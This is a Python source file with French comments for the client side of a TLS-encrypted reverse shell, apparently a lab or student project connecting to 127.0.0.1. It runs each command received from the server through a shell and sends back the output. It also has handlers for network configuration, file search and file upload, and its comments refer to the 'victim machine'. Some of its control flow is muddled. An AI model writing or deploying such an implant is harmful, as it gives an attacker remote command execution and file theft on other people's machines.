import socket
import subprocess
import ssl
import os

# Création du socket TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Création du contexte SSL pour vérifier le serveur
context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)

# Chargement du certificat du serveur pour la vérification
context.load_verify_locations('cert.pem')

# Envelopper le socket avec SSL
se = context.wrap_socket(s, server_hostname="127.0.0.1")

# Connexion au serveur
host = "127.0.0.1"
port = 9999
se.connect((host, port))
print("Connexion chiffrée établie avec le serveur")

# Envoi de la commande initiale
#se.send("la connexion est chiffrée".encode('utf-8'))

try:
    while True:
        command = se.recv(1024).decode() # Reception de la commande
        if not command:
            break
        print("Commande reçue:", command) # Affichage de la commande reçue
        if command == "help":
         help_text = se.recv(4096).decode("UTF-8", errors='ignore') # Reception de la liste des commandes
         print("Liste des commandes disponibles:")
         print(help_text)
         continue
        if command.lower() == 'shell': # Si la commande est shell
                print("Entré dans le mode shell. Tapez 'exit' pour quitter.")
                while True:
                    shell_cmd = input('shell-# ')
                    if shell_cmd.lower() == 'exit':
                        se.send(shell_cmd.encode('utf-8'))
                        break
                    se.send(shell_cmd.encode('utf-8'))
                    response = se.recv(4096).decode('utf-8')
                    print(response)
        if command.lower() == "ipconfig": # Si la commande est ipconfig
            print("Obtention de la configuration réseau de la machine victime")
            ipconfig = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            ipconfig_bytes = ipconfig.stdout.read() + ipconfig.stderr.read()
            ipconfig_str = ipconfig_bytes.decode(errors='ignore')
            se.send(ipconfig_str.encode('utf-8', errors='ignore'))
            continue
        if command.lower() == "search": # Si la commande est search
            print("Recherche d'un fichier sur la machine victime")
            se.send("search".encode('utf-8'))
            search_file = input("Nom du fichier à rechercher: ")
            se.send(search_file.encode('utf-8'))
            search_result = se.recv(4096).decode('utf-8')
            print(search_result)
            continue
        if command.lower() == "upload": # Si la commande est upload
            filename = input("Entrez le nom du fichier à envoyer: ")
            normalized_filename = os.path.normpath(filename)
            if os.path.exists(normalized_filename):
                    se.send(command.encode('utf-8'))
                    se.send(os.path.basename(normalized_filename).encode('utf-8'))
                    try:
                        with open(normalized_filename, "rb") as f:
                            while True:
                                file_data = f.read(4096)
                                if not file_data:
                                    break
                                se.sendall(file_data)
                        print("Fichier envoyé.")
                    except Exception as e:
                        print(f"Erreur lors de l'envoi du fichier : {str(e)}")
        else:
                    print("Fichier non trouvé.")
            
        

       
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
        cmd_str = cmd_bytes.decode(errors='ignore')

        # Envoyer le résultat de la commande au serveur
        se.send(cmd_str.encode('utf-8', errors='ignore'))
finally:
    # Fermeture de la connexion
    se.close()
    print("Connexion fermée")
